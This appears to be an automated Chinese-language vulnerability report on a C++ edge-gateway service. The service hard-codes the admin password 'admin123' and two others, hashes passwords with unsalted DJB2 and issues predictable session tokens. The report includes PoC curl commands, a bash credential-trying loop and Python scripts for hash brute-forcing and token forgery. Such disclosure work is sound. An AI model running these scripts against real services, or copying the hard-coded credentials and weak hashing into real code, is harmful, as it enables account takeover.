# VULN-DF-US-001: 用户认证模块硬编码明文密码，管理员账户使用弱口令可直接获取系统控制权

**严重性**: Critical | **CWE**: CWE-798 (Use of Hard-coded Credentials) | **置信度**: 85/100
**位置**: `src/user_store.cpp:6-10` @ `UserStore::UserStore`

---

## 1. 漏洞细节

`UserStore` 类的构造函数中硬编码了三个用户账户及其明文密码，包括一个拥有管理员权限的账户。所有密码通过 `weakHash()` 函数进行哈希处理后存储，但该函数实现的是 DJB2 算法——一种 32 位非密码学哈希函数，具有以下致命缺陷：

1. **无盐值（No Salt）**: 所有密码使用相同的哈希参数，相同密码产生相同哈希值
2. **32 位输出空间**: 仅约 43 亿种可能的哈希值，现代硬件可在数秒内完成暴力破解
3. **无迭代拉伸**: 单次计算，无 PBKDF2/bcrypt/scrypt 等密钥拉伸机制
4. **输出为十进制字符串**: `std::to_string(value)` 将 32 位整数直接转为字符串，进一步降低了逆向难度

管理员账户使用 `admin123` 作为密码，这是一个在常见弱口令字典中排名前列的密码，即使不知道源码，攻击者也可通过简单的字典攻击成功登录。

认证成功后，`issueSession()` 函数生成的会话令牌同样存在安全问题——由用户名和当前时间戳拼接而成（`sess-{username}-{timestamp}`），攻击者可轻易伪造有效会话。

## 2. 漏洞代码

**文件**: `src/user_store.cpp` (行 6-10)

```cpp
// 构造函数：硬编码三个用户账户及明文密码
UserStore::UserStore() {
  users_["alice"] = {"alice", weakHash("wonderland"), false};      // 行 7: 硬编码密码 "wonderland"
  users_["operator"] = {"operator", weakHash("op-password"), false}; // 行 8: 硬编码密码 "op-password"
  users_["admin"] = {"admin", weakHash("admin123"), true};          // 行 9: 硬编码管理员密码 "admin123"
}
```

**文件**: `src/user_store.cpp` (行 12-18) — 弱哈希函数

```cpp
std::string UserStore::weakHash(const std::string& password) const {
  unsigned int value = 5381;                                        // DJB2 初始值
  for (char ch : password) {
    value = ((value << 5) + value) + static_cast<unsigned char>(ch); // value = value * 33 + ch
  }
  return std::to_string(value);                                     // 32位整数转字符串，无盐值
}
```

**文件**: `src/user_store.cpp` (行 20-26) — 认证函数

```cpp
bool UserStore::authenticate(const std::string& username, const std::string& password) const {
  auto user = users_.find(username);
  if (user == users_.end()) {
    return false;
  }
  return user->second.passwordHash == weakHash(password);  // 行 25: 使用弱哈希比较密码
}
```

**文件**: `src/user_store.cpp` (行 33-37) — 可预测的会话令牌生成

```cpp
std::string UserStore::issueSession(const std::string& username) const {
  char token[32];
  std::sprintf(token, "sess-%s-%ld", username.c_str(), static_cast<long>(std::time(nullptr)));
  return token;  // 格式: sess-{username}-{unix_timestamp}，完全可预测
}
```

**代码分析**:

- **行 7-9**: 三个账户的明文密码直接出现在源代码中。即使经过编译，这些字符串常量会保留在二进制文件中，可通过 `strings` 命令或反汇编轻松提取。
- **行 12-18**: DJB2 是经典的字符串哈希函数，设计用于哈希表而非密码存储。32 位输出空间意味着彩虹表仅需约 16GB 存储空间即可覆盖所有可能的哈希值。
- **行 25**: 认证比较使用简单的字符串相等性判断，无时序攻击防护（constant-time comparison）。
- **行 33-37**: 会话令牌由用户名和时间戳组成，攻击者知道用户名后只需猜测服务器时间即可伪造令牌。

## 3. 完整攻击链路

```
[网络入口] POST /login@src/main.cpp:40
↓ HTTP 请求参数 user=admin&password=admin123
[参数提取] queryValue(request, "user") / queryValue(request, "password")@src/main.cpp:41-42
↓ username="admin", password="admin123" 直接传入认证函数
[认证调用] users.authenticate(username, password)@src/main.cpp:45
↓ 调用 authenticate()
[哈希比较] weakHash("admin123") == users_["admin"].passwordHash@src/user_store.cpp:25
↓ DJB2("admin123") 与构造函数中预计算的哈希值匹配
[认证成功] 返回 true → issueSession("admin")@src/main.cpp:49
↓ 生成可预测的会话令牌 sess-admin-{timestamp}
[管理员访问] 后续请求可访问 /admin/export 等管理员端点@src/main.cpp:70-74
```

**攻击链路详细说明**:

1. **入口点** (`src/main.cpp:40-52`): `POST /login` 路由处理器接收 HTTP 请求，从查询参数中提取 `user` 和 `password` 字段。无任何速率限制、账户锁定或 CAPTCHA 机制。

2. **参数传递** (`src/main.cpp:41-42`): `queryValue()` 函数直接从 `request.query` map 中取值，无任何输入清洗或验证，用户名和密码原样传递给 `authenticate()`。

3. **认证逻辑** (`src/user_store.cpp:20-26`): `authenticate()` 在 `users_` map 中查找用户名，找到后对输入密码执行 `weakHash()` 并与存储的哈希值比较。

4. **哈希匹配** (`src/user_store.cpp:12-18`): 由于密码 `admin123` 是硬编码的，DJB2 哈希值是确定性的，攻击者输入的密码经过相同的 DJB2 计算后必然匹配。

5. **权限提升**: 认证成功后，`admin` 账户的 `admin=true` 标志使其可访问管理员功能，如 `/admin/export` 端点（`src/main.cpp:70-74`）。

## 4. 攻击场景

**攻击者画像**: 任何能够访问该服务网络端口的远程未认证用户。无需任何先验权限或内部知识。

**攻击向量**: 通过 HTTP POST 请求直接访问 `/login` 端点，使用硬编码的管理员凭据进行认证。

**利用难度**: **低**

### 攻击步骤

1. **信息收集**: 攻击者发现目标运行 edge-gateway 服务（默认端口 8080）
2. **凭据获取**: 攻击者通过以下任一方式获取凭据：
   - 直接尝试常见弱口令 `admin/admin123`（字典攻击）
   - 获取源代码后直接读取硬编码密码
   - 对二进制文件执行 `strings` 命令提取明文密码
   - 逆向 DJB2 哈希值还原明文密码
3. **登录认证**: 发送 `POST /login?user=admin&password=admin123` 获取管理员会话
4. **权限利用**: 使用返回的会话令牌访问管理员功能（如 `/admin/export`）
5. **横向扩展**: 利用管理员权限进一步渗透系统

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                   |
| ---------- | -------------- | -------------------------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 攻击者需要能够访问 edge-gateway 服务的 HTTP 端口（默认 8080），可通过 `argv[1]` 自定义 |
| 认证要求   | 无需任何认证   | 攻击者无需任何先验凭据或认证，直接使用硬编码密码即可登录                               |
| 配置依赖   | 无特殊配置要求 | 服务启动后即可利用，无需特定配置选项                                                   |
| 环境依赖   | 无特殊环境要求 | 任何支持 C++17 的平台上编译运行均可被利用                                              |
| 时序条件   | 无时序依赖     | 硬编码凭据在服务整个生命周期内始终有效                                                 |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                     |
| -------- | ---- | -------------------------------------------------------------------------------------------------------- |
| 机密性   | 高   | 攻击者获取管理员权限后可通过 `/admin/export` 导出系统数据；三个账户的密码完全暴露                         |
| 完整性   | 高   | 管理员权限可能允许修改系统配置、用户数据和业务逻辑；`/admin/export` 端点可被滥用                          |
| 可用性   | 中   | 攻击者获取管理员权限后可能影响服务正常运行；会话令牌可被伪造导致合法用户被排斥                             |

**影响范围**: 全局影响。管理员账户（`admin=true`）授予对整个系统的完全控制权。攻击者可访问所有管理员功能、导出系统数据，并可能进一步利用管理员权限进行横向移动，影响同一网络中的其他系统。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 直接使用硬编码凭据登录

```bash
# 使用管理员账户登录（密码为硬编码的 admin123）
curl -X POST "http://TARGET:8080/login?user=admin&password=admin123"

# 预期响应:
# HTTP 200
# session=sess-admin-{unix_timestamp}
```

### PoC 2: 遍历所有硬编码账户

```bash
#!/bin/bash
# 仅供安全测试使用 - 验证所有硬编码凭据

TARGET="http://localhost:8080"

# 三个硬编码账户
declare -A CREDENTIALS=(
  ["alice"]="wonderland"
  ["operator"]="op-password"
  ["admin"]="admin123"
)

for user in "${!CREDENTIALS[@]}"; do
  pass="${CREDENTIALS[$user]}"
  echo "[*] 尝试登录: ${user}:${pass}"
  response=$(curl -s -w "\n%{http_code}" -X POST "${TARGET}/login?user=${user}&password=${pass}")
  http_code=$(echo "$response" | tail -1)
  body=$(echo "$response" | head -1)
  
  if [ "$http_code" = "200" ]; then
    echo "[+] 登录成功! 响应: ${body}"
  else
    echo "[-] 登录失败 (HTTP ${http_code})"
  fi
done
```

### PoC 3: DJB2 哈希逆向验证

```python
#!/usr/bin/env python3
"""
仅供安全测试使用 - 验证 DJB2 哈希的可逆性
演示 32 位非密码学哈希的脆弱性
"""

def djb2_hash(password: str) -> int:
    """复现 C++ 中的 weakHash 函数"""
    value = 5381
    for ch in password:
        value = ((value << 5) + value + ord(ch)) & 0xFFFFFFFF
    return value

# 已知的硬编码密码及其 DJB2 哈希值
known_passwords = ["wonderland", "op-password", "admin123"]

print("=== DJB2 哈希值计算 ===")
for pwd in known_passwords:
    h = djb2_hash(pwd)
    print(f"  weakHash(\"{pwd}\") = {h} (0x{h:08X})")

# 暴力破解演示：32位空间可在秒级完成
print(f"\n=== 暴力破解空间 ===")
print(f"  32位输出空间: 2^32 = {2**32:,} 种可能")
print(f"  现代 CPU 每秒可计算约 10^9 个 DJB2 哈希")
print(f"  完整暴力破解时间: 约 {2**32 / 10**9:.1f} 秒")
```

### PoC 4: 会话令牌伪造

```python
#!/usr/bin/env python3
"""
仅供安全测试使用 - 演示可预测的会话令牌
"""
import time

def forge_session(username: str, timestamp: int = None) -> str:
    """复现 issueSession() 的令牌生成逻辑"""
    if timestamp is None:
        timestamp = int(time.time())
    return f"sess-{username}-{timestamp}"

# 伪造管理员会话令牌
print("=== 伪造管理员会话令牌 ===")
for delta in range(-5, 6):
    ts = int(time.time()) + delta
    token = forge_session("admin", ts)
    print(f"  {token}")

print("\n[*] 攻击者只需猜测服务器时间（±几秒）即可伪造有效令牌")
```

**使用说明**: 

1. 启动 edge-gateway 服务
2. 使用 PoC 1 的 curl 命令直接验证管理员登录
3. 使用 PoC 2 的脚本遍历所有硬编码账户
4. 使用 PoC 3 验证 DJB2 哈希的脆弱性
5. 使用 PoC 4 验证会话令牌的可预测性

**预期结果**: 

- PoC 1: 返回 HTTP 200 和有效的管理员会话令牌
- PoC 2: 所有三个账户均登录成功
- PoC 3: 确认 DJB2 哈希值可被快速暴力破解
- PoC 4: 成功伪造与服务器生成格式一致的会话令牌

## 8. 验证环境搭建

### 基础环境

- 操作系统: 任意 Linux 发行版（Ubuntu 20.04+、Debian 11+、Alpine 3.14+ 等）
- 编译器: GCC 8+ 或 Clang 7+（支持 C++17 标准）
- 构建工具: CMake 3.16+
- 依赖: 无外部依赖库（仅使用 C++ 标准库）

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置和编译
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 可执行文件生成在 build/edge-gateway
```

### 运行配置

```bash
# 默认端口 8080 启动
./build/edge-gateway

# 或指定自定义端口
./build/edge-gateway 9090
```

无需额外配置文件或环境变量。服务启动后在控制台输出 `edge-gateway listening on port {port}`。

### 验证步骤

1. 启动 edge-gateway 服务：`./build/edge-gateway`
2. 在另一终端执行 PoC 1 的 curl 命令：
   ```bash
   curl -v -X POST "http://localhost:8080/login?user=admin&password=admin123"
   ```
3. 观察返回的 HTTP 状态码和会话令牌
4. 使用返回的令牌访问管理员端点：
   ```bash
   curl "http://localhost:8080/admin/export?token=sess-admin-{timestamp}"
   ```
5. 验证三个账户均可成功登录

### 预期结果

- `POST /login?user=admin&password=admin123` 返回 HTTP 200，响应体包含 `session=sess-admin-{timestamp}`
- `POST /login?user=alice&password=wonderland` 返回 HTTP 200
- `POST /login?user=operator&password=op-password` 返回 HTTP 200
- 使用错误密码（如 `admin/wrong`）返回 HTTP 401，响应体为 `invalid credentials`
- 使用二进制分析工具可提取硬编码密码：
  ```bash
  strings build/edge-gateway | grep -E "admin123|wonderland|op-password"
  ```
  预期输出包含所有三个明文密码字符串
